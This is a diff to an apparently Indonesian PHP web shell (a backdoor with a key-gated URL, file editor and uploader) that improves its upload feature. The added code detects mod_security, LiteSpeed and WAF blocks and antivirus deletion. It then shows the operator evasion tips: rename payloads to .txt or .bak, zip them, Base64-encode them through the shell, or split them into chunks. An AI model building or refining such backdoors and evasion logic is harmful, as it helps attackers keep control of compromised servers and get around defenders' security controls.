@@ -3522,7 +3522,7 @@ if (isset($_POST['save_edit']) && isset($_POST['edit_file']) && isset($_POST['fi
     header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
     exit;
 }
-// 🎯 ENHANCED FILE UPpload with detailed error handling
+// 🎯 ENHANCED FILE UPload with detailed error handling
 if (isset($_FILES['upload_file'])) {
     $uploadedCount = 0;
     $failedCount = 0;
@@ -3531,13 +3531,45 @@ if (isset($_FILES['upload_file'])) {
     $uploadedFiles = [];
     $failedFiles = [];
     
+    // 🎯 DETEKSI MOD_SECURITY / FIREWALL BLOCK
+    // Jika $_FILES ada tapi kosong, kemungkinan diblok firewall
+    if (empty($_FILES['upload_file']['name'][0]) && $_SERVER['REQUEST_METHOD'] === 'POST') {
+        // Cek apakah ada header mod_security
+        $modsecHit = false;
+        foreach (getallheaders() as $header => $value) {
+            if (stripos($header, 'mod_security') !== false || 
+                stripos($header, 'x-mod-sec') !== false ||
+                stripos($value, '403') !== false) {
+                $modsecHit = true;
+                break;
+            }
+        }
+        
+        $output = "❌ Upload blocked by server firewall!\n\n";
+        if ($modsecHit) {
+            $output .= "🛡️ mod_security blocked the upload.\n";
+        } else {
+            $output .= "🛡️ Server firewall (LiteSpeed/Apache/Nginx) blocked the upload.\n";
+        }
+        $output .= "\nPossible reasons:\n";
+        $output .= "• File content flagged as suspicious\n";
+        $output .= "• File extension blacklisted\n";
+        $output .= "• File size exceeds server limit\n";
+        $output .= "• WAF rule triggered\n\n";
+        $output .= "💡 Workarounds:\n";
+        $output .= "1. Rename file to .txt or .bak first\n";
+        $output .= "2. Compress as .zip file\n";
+        $output .= "3. Use Base64 encoding via shell\n";
+        $output .= "4. Split file into smaller chunks\n";
+    } else {
+    
     // Define upload error messages
     $uploadErrorMessages = [
         UPLOAD_ERR_OK => 'Success',
         UPLOAD_ERR_INI_SIZE => 'File too large (exceeds upload_max_filesize)',
         UPLOAD_ERR_FORM_SIZE => 'File too large (exceeds MAX_FILE_SIZE)',
         UPLOAD_ERR_PARTIAL => 'File partially uploaded',
-        UPLOAD_ERR_NO_FILE => 'No file uploaded',
+        UPLOAD_ERR_NO_FILE => 'No file uploaded (possibly blocked by firewall)',
         UPLOAD_ERR_NO_TMP_DIR => 'Missing temp folder',
         UPLOAD_ERR_CANT_WRITE => 'Failed to write file',
         UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
@@ -3587,16 +3619,46 @@ if (isset($_FILES['upload_file'])) {
                     $isOverwrite = file_exists($target);
                     
                     if (move_uploaded_file($_FILES['upload_file']['tmp_name'][$i], $target)) {
-                        $uploadedCount++;
-                        $uploadedFiles[] = [
-                            'name' => $baseName,
-                            'size' => $fileSize,
-                            'overwrite' => $isOverwrite
-                        ];
+                        // 🎯 VERIFIKASI AKTUAL: Pastikan file benar-benar ada dan ukurannya benar
+                        clearstatcache(true, $target);
+                        if (file_exists($target) && is_file($target)) {
+                            $actualSize = filesize($target);
+                            if ($actualSize == $fileSize) {
+                                $uploadedCount++;
+                                $uploadedFiles[] = [
+                                    'name' => $baseName,
+                                    'size' => $fileSize,
+                                    'overwrite' => $isOverwrite
+                                ];
+                            } else {
+                                // File exists tapi ukuran beda = corrupt/partial
+                                $failedCount++;
+                                $failedFiles[] = [
+                                    'name' => $fileName,
+                                    'reason' => 'File size mismatch (expected: ' . format_bytes($fileSize) . ', got: ' . format_bytes($actualSize) . ')'
+                                ];
+                                // Hapus file corrupt
+                                @unlink($target);
+                            }
+                        } else {
+                            // File tidak ada setelah move (aneh, tapi mungkin terjadi)
+                            $failedCount++;
+                            $failedFiles[] = [
+                                'name' => $fileName,
+                                'reason' => 'File disappeared after upload (possible antivirus deletion)'
+                            ];
+                        }
                     } else {
                         $failedCount++;
                         $lastError = error_get_last();
                         $errorMsg = ($lastError && isset($lastError['message'])) ? $lastError['message'] : 'Unknown error';
+                        
+                        // Deteksi mod_security berdasarkan error message
+                        if (stripos($errorMsg, 'permission') !== false || 
+                            stripos($errorMsg, 'denied') !== false) {
+                            $errorMsg .= ' (Possible mod_security/antivirus block)';
+                        }
+                        
                         $failedFiles[] = [
                             'name' => $fileName,
                             'reason' => 'Move failed: ' . $errorMsg
@@ -3964,7 +4026,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 020426 2054</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 020426 2103</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -5632,24 +5694,66 @@ function sortTable(columnIndex) {
             method: 'POST',
             body: newFormData
         })
-        .then(response => response.text())
+        .then(response => {
+            // 🎯 CEK HTTP STATUS TERLEBIH DAHULU
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+            }
+            return response.text();
+        })
         .then(html => {
             clearInterval(progressInterval);
-            submitBtn.innerHTML = '✅ Completed!';
+            
+            // 🎯 CEK JIKA RESPONSE MENGANDUNG ERROR PAGE (403, 500, etc)
+            const lowerHtml = html.toLowerCase();
+            const isForbidden = 
+                lowerHtml.includes('403 forbidden') || 
+                lowerHtml.includes('access denied') ||
+                lowerHtml.includes('mod_security') ||
+                lowerHtml.includes('modsecurity') ||
+                lowerHtml.includes('blocked') ||
+                lowerHtml.includes('litespeed') ||
+                lowerHtml.includes('security violation') ||
+                lowerHtml.includes('suspicious activity') ||
+                html.includes('<title>403</title>') ||
+                html.includes('<h1>Forbidden</h1>') ||
+                html.includes('has been blocked');
+            
+            if (isForbidden) {
+                submitBtn.innerHTML = '❌ Blocked!';
+                showUploadResult({
+                    type: 'error',
+                    title: '❌ Upload Blocked by Server',
+                    message: 'Server firewall (mod_security/LiteSpeed) blocked the upload.',
+                    details: `The file was rejected by server security rules.\n\nPossible causes:\n• File content detected as malicious\n• File extension blacklisted\n• File size too large for server\n• mod_security rule triggered\n\nTry:\n1. Rename file to .txt or .bak\n2. Compress as .zip\n3. Upload via Shell command instead`
+                });
+                return;
+            }
             
             // Parse response to check for success/error
             const parser = new DOMParser();
             const doc = parser.parseFromString(html, 'text/html');
-            const outputEl = doc.querySelector('.output');
+            const outputEl = doc.getElementById('uploadOutput') || doc.querySelector('.output');
+            
+            let shouldRefresh = false;
             
             if (outputEl) {
                 const outputText = outputEl.textContent.trim();
+                submitBtn.innerHTML = outputText.startsWith('✅') ? '✅ Completed!' : 
+                                      outputText.startsWith('⚠️') ? '⚠️ Partial' : '❌ Failed!';
                 
                 // Determine result type
                 let resultType = 'info';
-                if (outputText.startsWith('✅')) resultType = 'success';
-                else if (outputText.startsWith('⚠️')) resultType = 'warning';
-                else if (outputText.startsWith('❌')) resultType = 'error';
+                if (outputText.startsWith('✅')) {
+                    resultType = 'success';
+                    shouldRefresh = true; // Only refresh on success
+                } else if (outputText.startsWith('⚠️')) {
+                    resultType = 'warning';
+                    shouldRefresh = true; // Partial success, still refresh
+                } else if (outputText.startsWith('❌')) {
+                    resultType = 'error';
+                    shouldRefresh = false; // Don't refresh on error
+                }
                 
                 // Show detailed result modal
                 showUploadResult({
@@ -5661,10 +5765,14 @@ function sortTable(columnIndex) {
                     details: outputText.split('\n').slice(1).join('\n')
                 });
             } else {
+                // 🎯 JIKA TIDAK ADA OUTPUT ELEMENT, JANGAN ASUMSI SUKSES
+                submitBtn.innerHTML = '⚠️ Unknown Status';
+                shouldRefresh = false;
                 showUploadResult({
-                    type: 'success',
-                    title: '✅ Upload Completed',
-                    message: 'Files uploaded successfully!'
+                    type: 'warning',
+                    title: '⚠️ Upload Status Unknown',
+                    message: 'Cannot verify upload result from server response.',
+                    details: 'The server responded but no status information was found.\n\nPlease check the Files tab to verify if the upload succeeded.\n\nCommon causes:\n• Server error page returned\n• Response truncated\n• Network timeout'
                 });
             }
             
@@ -5676,8 +5784,10 @@ function sortTable(columnIndex) {
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = '📤 Upload <span id="fileCount">0</span> File(s)';
                 
-                // Refresh page to show new files
-                window.location.reload();
+                // 🎯 HANYA REFRESH JIKA UPLOAD SUKSES (atau partial)
+                if (shouldRefresh) {
+                    window.location.reload();
+                }
             }, 2000);
         })
         .catch(error => {
